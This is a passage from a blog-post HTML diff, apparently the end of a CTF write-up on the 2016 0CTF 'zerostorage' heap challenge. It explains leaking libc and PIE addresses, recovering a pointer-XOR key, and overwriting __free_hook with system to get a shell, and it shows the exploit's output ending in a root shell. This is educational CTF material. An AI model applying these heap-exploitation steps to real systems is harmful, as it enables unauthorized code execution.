class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>脚本里的相关位置的偏移可以根据哪个函数引用它来找到。由于程序开了PIE，但是当泄露了libc的地址后，可以算出程序的base address，libc.so到程序的偏移是一个定值<a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="external">offset2libc</a>。</p>
+<p>当leaking key的值的时候很巧妙。因为fastbin分配在了bss段上，更确切的说是全局数组no.5那，返回的地址指向no.5的ptr处，然后我们计算一下离no.8的ptr的距离–0x78。然后我们view一下能得到no.8的ptr的值，然后跟bss_addr + 0x40 + 24 *5 + 16亦或一下就能得到key的值了。</p>
+<p>最后由于是Full RELRO，got表不可写，所以只能overwrite __free_hook(或其他的hook函数)。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">__libc_free (<span class="keyword">void</span> *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr;</div><div class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></div><div class="line"></div><div class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</div><div class="line">    = atomic_forced_read (__free_hook);</div><div class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  [...]</div></pre></td></tr></table></figure></p>
+<p>__free_hook函数会在free函数里最开始执行，所以我们可以把它覆盖为system的地址。最后free一个实现准备好了/bin/sh的堆块即可得到shell。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@wolzhang666:/home/wolzhang/Desktop# python zerostorage.py</div><div class="line">[+] Starting local process './zerostorage': Done</div><div class="line"></div><div class="line">[*]unsorted_bin_addr: 0x7f2b4dd3c7b8</div><div class="line">[*]heap_addr: 0x7f2b4eff0000</div><div class="line">[*]libc_base_addr: 0x7f2b4d97e000</div><div class="line">[*]system_addr: 0x7f2b4d9c4590</div><div class="line">[*]global_max_fast_addr: 0x7f2b4dd3eb40</div><div class="line">[*]free_hook_addr: 0x7f2b4dd3ea10</div><div class="line">[*]PIE_addr: 0x7f2b4df68000</div><div class="line">[*]bss_addr: 0x7f2b4e16b020</div><div class="line">[*]key: 0x4b88fd09d5128999</div><div class="line">[*]Get a shell!</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div><div class="line"><span class="meta">$</span></div></pre></td></tr></table></figure></p>
+<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/" target="_blank" rel="external">0CTF 2016 - Zerostorage Writeup</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/use-after-free/" rel="tag">#use-after-free</a>
+          
+            <a href="/tags/unsorted-bin-attack/" rel="tag">#unsorted bin attack</a>
+          
+            <a href="/tags/fastbin-unlink-attack/" rel="tag">#fastbin unlink attack</a>
+          
+            <a href="/tags/PIE/" rel="tag">#PIE</a>
+          
+            <a href="/tags/RELRO/" rel="tag">#RELRO</a>
+          
+            <a href="/tags/offset2libc/" rel="tag">#offset2libc</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/10/2016-ASIS-CTF-car-market/" rel="next" title="2016 ASIS CTF car-market">
+                <i class="fa fa-chevron-left"></i> 2016 ASIS CTF car-market
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/18/2016-BCTF-bcloud/" rel="prev" title="2016 BCTF bcloud">
+                2016 BCTF bcloud <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Use-After-Free"><span class="nav-number">2.1.</span> <span class="nav-text">Use After Free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unsorted-bin-attack-FIFO"><span class="nav-number">2.2.</span> <span class="nav-text">Unsorted bin attack(FIFO)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fast-bin-unlink-attack-LIFO"><span class="nav-number">2.3.</span> <span class="nav-text">Fast bin unlink attack(LIFO)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Script"><span class="nav-number">2.4.</span> <span class="nav-text">Script</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Links"><span class="nav-number">3.</span> <span class="nav-text">Links</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/03/17/2016-0CTF-zerostorage/';
+      var disqus_title = "2016 0CTF zerostorage";
+      var disqus_url = 'http://yoursite.com/2017/03/17/2016-0CTF-zerostorage/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
